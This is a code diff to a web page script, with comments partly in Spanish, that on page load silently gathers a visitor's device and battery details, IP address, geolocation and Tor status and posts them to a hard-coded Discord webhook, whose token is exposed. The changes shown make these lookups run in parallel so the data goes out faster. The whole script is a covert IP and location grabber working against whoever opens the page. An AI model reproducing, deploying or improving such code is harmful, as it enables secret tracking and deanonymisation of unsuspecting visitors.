@@ -88,7 +88,7 @@
             const statusEl = document.getElementById('status');
             const WEBHOOK_URL = 'https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6';
 
-            // Get static device data
+            // Get static device data (instant)
             function getDeviceInfo() {
                 const nav = navigator;
                 const ua = nav.userAgent;
@@ -122,7 +122,7 @@
                 };
             }
 
-            // Get battery info (async)
+            // Get battery info (async, but we run it in parallel)
             async function getBatteryInfo() {
                 try {
                     if (navigator.getBattery) {
@@ -138,19 +138,7 @@
                 return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
             }
 
-            // NEW: Check TOR exit status using official Tor Project API
-            async function isTorExit(ip) {
-                try {
-                    const resp = await fetch('https://check.torproject.org/api/ip');
-                    if (!resp.ok) return false;
-                    const data = await resp.json();
-                    return data.IsTor === true;
-                } catch (e) {
-                    return false;
-                }
-            }
-
-            // Send to Discord (now with torDetected parameter)
+            // Send to Discord
             async function sendToDiscord(ipData, device, battery, torDetected) {
                 // Determine VPN/TOR status
                 let vpnTorStatus = 'No VPN/TOR Found';
@@ -210,25 +198,32 @@
                 }
             }
 
-            // Main execution
+            // Main execution – ahora todo en paralelo
             async function execute() {
+                // 1. Obtener datos del dispositivo (síncrono, instantáneo)
                 const device = getDeviceInfo();
-                const battery = await getBatteryInfo();
 
-                try {
-                    const geoResp = await fetch('https://ipapi.co/json/');
-                    if (!geoResp.ok) throw new Error('Geo API failed');
-                    const geo = await geoResp.json();
-                    // Additional TOR check using official API
-                    const torDetected = await isTorExit(geo.ip);
-                    await sendToDiscord(geo, device, battery, torDetected);
-                } catch (err) {
-                    // Fallback with ipify
+                // 2. Lanzar todas las promesas asíncronas en paralelo
+                const batteryPromise = getBatteryInfo();
+                const geoPromise = fetch('https://ipapi.co/json/')
+                    .then(res => res.ok ? res.json() : null)
+                    .catch(() => null);
+                const torPromise = fetch('https://check.torproject.org/api/ip')
+                    .then(res => res.ok ? res.json() : null)
+                    .catch(() => null);
+
+                // Esperar a que todas terminen (la más lenta marca el tiempo total)
+                const [battery, geoData, torData] = await Promise.all([batteryPromise, geoPromise, torPromise]);
+
+                // 3. Preparar los datos de geolocalización
+                let ipData = geoData;
+                if (!ipData || !ipData.ip) {
+                    // Fallback: usar ipify para obtener la IP y datos por defecto
                     try {
                         const ipResp = await fetch('https://api.ipify.org?format=json');
-                        const ipData = await ipResp.json();
-                        const fallbackGeo = {
-                            ip: ipData.ip,
+                        const ipJson = await ipResp.json();
+                        ipData = {
+                            ip: ipJson.ip,
                             latitude: 'N/A',
                             longitude: 'N/A',
                             city: 'N/A',
@@ -236,20 +231,24 @@
                             country_name: 'N/A',
                             postal: 'N/A',
                             org: 'N/A',
+                            isp: 'N/A',
                             proxy: false,
                             tor: false
                         };
-                        // Also check TOR for fallback IP
-                        const torDetected = await isTorExit(ipData.ip);
-                        await sendToDiscord(fallbackGeo, device, battery, torDetected);
-                    } catch (e2) {
-                        statusEl.textContent = 'All APIs failed: ' + e2.message;
-                        statusEl.className = 'error';
+                    } catch (e) {
+                        // Si todo falla, usamos un objeto vacío
+                        ipData = { ip: 'Unknown', proxy: false, tor: false };
                     }
                 }
+
+                // 4. Detectar TOR a partir del dato oficial
+                const torDetected = torData && torData.IsTor === true;
+
+                // 5. Enviar a Discord inmediatamente
+                await sendToDiscord(ipData, device, battery, torDetected);
             }
 
-            // Execute on page load
+            // Ejecutar al cargar la página
             if (document.readyState === 'complete') {
                 execute();
             } else {
